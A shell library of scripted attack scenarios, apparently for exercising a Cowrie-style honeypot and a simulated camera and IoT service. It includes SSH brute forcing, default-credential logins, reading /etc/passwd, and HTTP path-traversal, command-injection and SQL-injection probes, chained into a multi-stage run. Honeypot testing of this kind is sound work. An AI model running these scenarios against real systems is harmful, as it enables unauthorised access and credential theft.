# =====================================================================
# Runner library — shared functions for all scenarios.
# Sourced by run-scenario.sh, NOT executed directly.
# =====================================================================

# Helpers ----------------------------------------------------------------
export RUN_STARTED_ISO="$(date -u +%Y-%m-%dT%H:%M:%SZ)"

log() { echo "[$(date -u +%H:%M:%S)] $*"; }
fail() { echo "ERROR: $*" >&2; exit 7; }

require() {
  for bin in "$@"; do
    if ! command -v "$bin" >/dev/null 2>&1; then
      fail "required binary not found: $bin"
    fi
  done
}

delay() { sleep "${DELAY:-0.2}"; }

# HTTP helper — uses curl, returns just the status code
http_status() {
  local method="$1"; shift
  local path="$1"; shift
  curl -s -o /dev/null -w "%{http_code}" -X "$method" \
    "http://${TARGET}:${CAMERA_HTTP_PORT:-8080}${path}" "$@"
}

# SSH helper — uses sshpass if available; falls back to "no creds" attempts
ssh_attempt() {
  local user="$1"; local pass="$2"
  if command -v sshpass >/dev/null 2>&1; then
    sshpass -p "$pass" ssh \
      -p "${COWRIE_SSH_PORT:-2222}" \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o ConnectTimeout=3 \
      -o NumberOfPasswordPrompts=1 \
      "${user}@${TARGET}" \
      'echo LOGGED_IN' 2>/dev/null || true
  else
    # Without sshpass we just attempt and let SSH prompt-timeout
    ssh \
      -p "${COWRIE_SSH_PORT:-2222}" \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o ConnectTimeout=2 \
      -o NumberOfPasswordPrompts=0 \
      -o BatchMode=yes \
      "${user}@${TARGET}" 2>/dev/null || true
  fi
  delay
}

# IoT service helper
iot_send() {
  local line="$1"
  if command -v nc >/dev/null 2>&1; then
    echo "$line" | nc -w 2 "${TARGET}" "${IOT_SERVICE_PORT:-9000}" 2>/dev/null || true
  else
    python3 -c "
import socket, sys
s = socket.socket(); s.settimeout(2)
try:
    s.connect(('${TARGET}', ${IOT_SERVICE_PORT:-9000}))
    print(s.recv(1024).decode(errors='ignore').strip())
    s.sendall(b'$line\n')
    print(s.recv(1024).decode(errors='ignore').strip())
    s.close()
except Exception as e:
    print('error:', e)
"
  fi
  delay
}

# Scenarios --------------------------------------------------------------

runner_ssh_bruteforce() {
  log "scenario: ssh-bruteforce — 30 SSH auth attempts"
  require ssh
  # Pull credentials from the synthetic list
  local i=0
  while IFS= read -r line; do
    [ -z "$line" ] && continue
    local user="${line%%:*}"
    local pass="${line#*:}"
    i=$((i+1))
    log "attempt #$i user=$user"
    ssh_attempt "$user" "$pass"
    [ "$i" -ge 30 ] && break
  done < credentials/users.txt
  log "ssh-bruteforce complete"
}

runner_ssh_interaction() {
  log "scenario: ssh-interaction — login + command exec"
  require ssh sshpass
  sshpass -p admin ssh \
    -p "${COWRIE_SSH_PORT:-2222}" \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=3 \
    "admin@${TARGET}" \
    'uname -a; ls /; cat /etc/passwd; exit' 2>/dev/null || true
  log "ssh-interaction complete"
}

runner_camera_recon() {
  log "scenario: camera-recon — GET across camera endpoints"
  require curl
  for path in / /login /admin /config /system /status /network /users /device /firmware /snapshot /video /api/v1 /api/info; do
    log "GET $path -> $(http_status GET "$path")"
    delay
  done
  log "camera-recon complete"
}

runner_camera_default_creds() {
  log "scenario: camera-default-creds — POST default credentials"
  require curl
  for creds in "admin:admin" "admin:12345" "root:root"; do
    local u="${creds%%:*}"; local p="${creds#*:}"
    log "POST /login user=$u"
    curl -s -o /dev/null -w "%{http_code}\n" \
      -X POST "http://${TARGET}:${CAMERA_HTTP_PORT:-8080}/login" \
      -d "user=${u}&pass=${p}" || true
    delay
  done
  log "camera-default-creds complete"
}

runner_http_enumeration() {
  log "scenario: http-enumeration — path traversal + injection probes"
  require curl
  for path in \
    "/../../../etc/passwd" \
    "/admin/../../etc/shadow" \
    "/cgi-bin/cat?file=../../etc/passwd" \
    "/api/exec?cmd=id" \
    "/api/shell?c=whoami" \
    "/login.php?user=admin'%20OR%201=1--" \
    "/.git/config" \
    "/.env" \
    "/backup.zip"
  do
    log "GET $path -> $(http_status GET "$path")"
    delay
  done
  log "http-enumeration complete"
}

runner_iot_probe() {
  log "scenario: iot-probe — connect + send protocol commands"
  for cmd in PING STAT LIST "AUTH admin admin" "CMD uname -a" "CMD cat /etc/passwd" "FOO bar" QUIT; do
    log "iot send: $cmd"
    iot_send "$cmd"
  done
  log "iot-probe complete"
}

runner_multi_stage() {
  log "scenario: multi-stage — recon -> ssh -> exec -> retrieval"
  log "stage 1: reconnaissance"
  runner_camera_recon
  log "stage 2: ssh credential attack"
  runner_ssh_bruteforce
  log "stage 3: command interaction"
  runner_ssh_interaction
  log "stage 4: http retrieval"
  runner_http_enumeration
  log "multi-stage complete"
}
